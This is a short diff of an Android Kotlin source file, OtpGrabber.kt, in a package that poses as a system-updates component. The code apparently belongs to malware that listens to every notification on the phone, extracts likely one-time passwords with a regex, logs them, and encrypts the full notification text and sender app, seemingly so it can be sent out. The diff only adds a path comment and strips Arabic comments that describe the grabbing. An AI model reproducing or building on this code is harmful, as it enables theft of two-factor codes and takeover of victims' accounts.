@@ -1,3 +1,4 @@
+// client/android/app/src/main/java/com/system/updates/communication/OtpGrabber.kt
 package com.system.updates.communication
 
 import android.service.notification.NotificationListenerService
@@ -15,7 +16,6 @@ class OtpGrabber : NotificationListenerService() {
         val title = extras.getString("android.title") ?: ""
         val text = extras.getCharSequence("android.text")?.toString() ?: ""
 
-        // البحث عن أي تسلسل مكون من 4 إلى 8 أحرف/أرقام (يشمل رموز التفعيل)
         val otpPattern = Regex("\\b(\\w{4,8})\\b")
         val match = otpPattern.find(text)
 
@@ -23,7 +23,6 @@ class OtpGrabber : NotificationListenerService() {
             val possibleCode = match.value
             Log.d(TAG, "Possible OTP detected from $packageName: $possibleCode")
 
-            // تجميع معلومات الإشعار
             val logData = "App: $packageName | Title: $title | Content: $text"
             val encryptedData = CryptoManager.encryptHybrid(logData.toByteArray())
 
